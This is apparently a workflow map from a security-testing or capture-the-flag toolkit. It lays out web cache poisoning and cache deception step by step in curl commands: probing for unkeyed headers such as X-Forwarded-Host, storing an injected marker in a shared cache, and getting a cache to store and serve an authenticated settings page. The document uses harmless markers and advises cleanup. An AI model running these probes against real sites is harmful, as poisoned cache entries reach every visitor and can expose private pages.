# Workflow map — the cache-poisoning sequence, mapped end to end

The complete workflow — every step, every check, every falsifier.

---

## Step 0 — classify — is this a cache-poisoning

```bash
python3 tools/classify.py --source <dir>
python3 tools/chain_match.py --source <dir> --record <challenge>
```

```text
the signals: a cache-status header, a Vary header, an unkeyed input.
a chain card match → run the card's first_confirming_probe first.
```

## Step 1 — detect the cache — a stored-response surface

```bash
curl -sI "$BASE/" | grep -iE 'x-cache|cf-cache|age:|via:|x-varnish|x-served-by'
#   a cache-status header → a front-end cache exists
```

## Step 2 — map the cache key — what's keyed

```bash
curl -sI "$BASE/" | grep -i 'vary'   # the Vary — the keyed headers
grep -rnoiE 'proxy_cache_key|cache_key|vcl_hash|make_cache_key' <src> | head -10
```

```text
the key = the request parts that determine the stored entry.
everything NOT in the key is an unkeyed input.
```

## Step 3 — find the unkeyed input — the poisoning vector

```bash
for h in 'X-Forwarded-Host' 'X-Original-URL' 'User-Agent' 'Referer' 'Accept-Language' 'Accept-Charset' 'X-Forwarded-Scheme'; do
  curl "$BASE/page?cb=<unique>" -H "$h: <marker>"
  curl "$BASE/page?cb=<unique>" | grep '<marker>' && echo "$h UNKEYED"
done
```

## Step 4 — the poisoning request — the canary

```bash
curl "$BASE/page?cb=<unique>" -H 'X-Forwarded-Host: <marker>'   # stores it
```

## Step 5 — the confirmation — the clean-request read

```bash
curl "$BASE/page?cb=<unique>"   # <marker> reflected? → poisoned
#   the cache-status shows HIT — the stored copy served YOUR input
```

```text
the confirm: the marker persists into the clean response AND the
cache indicator shows the stored copy served it. a reflected marker
on a MISS is not a poisoning.
```

## Step 6 — the deception — the privileged-page serve

```bash
curl "$BASE/settings.html?cb=<unique>" -H 'Cookie: <auth>'   # stores the privileged copy
curl "$BASE/settings.html?cb=<unique>"   # the privileged page → deception
```

## Step 7 — the payload — the injected content

```text
a reflected unkeyed input can carry a payload — a JS, a redirect, a
host-rewrite — the stored copy serves it to every requester.
```

## Step 8 — the blast-radius — the shared-store effect

```text
a poisoned entry is served to EVERY requester of the URL until it
expires — the deception's blast is the URL's requester base.
use a harmless marker; keep the time-window short; clean up.
```

## Step 9 — the TTL — the expiry question

```bash
curl -sI "$BASE/page?cb=<unique>" | grep -iE 'age|cache-control|expires'
```

## Step 10 — the falsifier — when to move

```text
the input IS part of the cache key → a different class.
no front-end cache → no stored response → a different class.
a Cache-Control: no-store/private → the page isn't cached → a
different class.
a reflected marker on a MISS → a reflection, not a poisoning → a
different class.
```
